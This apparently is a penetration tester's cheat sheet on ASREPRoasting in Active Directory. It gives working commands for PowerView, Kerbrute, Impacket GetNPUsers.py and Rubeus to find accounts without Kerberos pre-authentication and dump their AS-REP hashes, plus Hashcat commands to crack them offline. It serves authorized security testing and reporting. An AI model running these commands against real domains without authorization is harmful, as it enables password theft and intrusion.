# ASREPRoasting Cheat Sheet

## Overview
- **What it is**: Attack to get Ticket Granting Ticket (TGT) for AD accounts with "Do not require Kerberos pre-authentication" enabled (UAC: DONT_REQ_PREAUTH).
- **Why vulnerable**: AS-REP encrypted with user's password; any domain user can request it without pre-auth.
- **Normal pre-auth**: User encrypts timestamp with password; DC validates before issuing TGT.
- **No pre-auth**: Attacker requests AS-REQ, gets encrypted TGT (AS-REP) for offline cracking (e.g., Hashcat/John).
- **Similar to Kerberoasting**: Targets AS-REP (not TGS-REP); no SPN required.
- **Success factors**: Weak passwords; if you have GenericWrite/GenericAll on account, enable/disable attribute temporarily.
- **View setting**: ADUC > User Properties > Account tab > "Do not require Kerberos preauthentication".
- **Report note**: Flag as finding even if uncrackable; assess if setting is needed.

## Enumeration
- **PowerView (Windows)**: Find users with pre-auth disabled.
  ```
  Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
  ```
  - Looks for UAC with DONT_REQ_PREAUTH bit set.
	![[Pasted image 20251007200604.png]]
- **PowerShell AD Module**: Built-in alternative to PowerView.
- **Kerbrute (Linux/Windows)**: During user enum, auto-dumps AS-REP for vulnerable users.
  ```bash
  kerbrute userenum -d DOMAIN --dc DC_IP /path/to/userlist.txt
  ```
  - Outputs hash if found: `$krb5asrep$23$user@DOMAIN:...`
- **Impacket GetNPUsers.py (Linux)**: Scan users for no pre-auth, dump hashes.
  ```bash
  GetNPUsers.py DOMAIN/ -dc-ip DC_IP -no-pass -usersfile userlist.txt
  ```
  - Skips non-vulnerable; outputs Hashcat-format hashes for vulnerable ones.
  - Works without auth if anonymous LDAP allowed; errors on invalid users.

## Attack Execution
- **No domain join needed**: Can run from non-domain host if you know SAMAccountName.
- **Rubeus (Windows)**: Roast AS-REP.
  ```
  .\Rubeus.exe asreproast /user:TARGET_USER /nowrap /format:hashcat
  ```
  - `/nowrap`: Prevents line wrapping for clean hash output.
  - Output: `$krb5asrep$23$user@DOMAIN:...`
- **If perms allow**: Enable DONT_REQ_PREAUTH, roast, then disable.
- **Kerbrute integration**: Auto-roasts during enum (see above).
	- ![[Pasted image 20251007201034.png]]
## Cracking
- **Hashcat**: Mode 18200 (Kerberos 5 AS-REP etype 23).
  ```
  hashcat -m 18200 hash_file /path/to/wordlist.txt
  ```
  - Example cracked: `Welcome!00`
- **John the Ripper**: Alternative cracker.
- **Tips**: Use rockyou.txt or custom lists; offline, no DC interaction.

## Key Tools
- **Windows**: PowerView (enum), Rubeus (roast).
- **Linux**: Kerbrute (enum + roast), Impacket GetNPUsers.py (enum + roast).
- **General**: No auth needed for roast if pre-auth disabled; great for initial foothold or escalation.